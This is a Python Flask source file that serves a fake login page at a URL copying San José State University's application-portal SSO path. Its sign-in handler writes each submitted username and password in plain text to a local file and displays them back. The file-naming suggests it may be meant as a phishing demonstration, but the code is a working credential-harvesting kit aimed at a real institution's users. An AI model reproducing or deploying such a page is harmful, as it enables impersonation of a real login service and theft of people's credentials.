import os

from flask import Flask, render_template, request, redirect

app = Flask(__name__)


@app.route("/app/sjsu_sjsuapplicationportal2023/exkwktiysqYFeXD6Y0x7/sso/saml")
def main_page():
    return render_template('sjsu_login.html')


@app.route("/")
def to_main():
    return redirect("/app/sjsu_sjsuapplicationportal2023/exkwktiysqYFeXD6Y0x7/sso/saml")


@app.route("/signin", methods=['GET', 'POST'])
def logged_in():
    save_path = os.getcwd() + "/demo_saved_credentials.txt"
    with open(save_path, 'a') as f:
        username = request.form['identifier']
        password = request.form['credentials.password']
        f.write(f"{username}: {password}\n")
        return render_template('display.html', username=username, password=password)
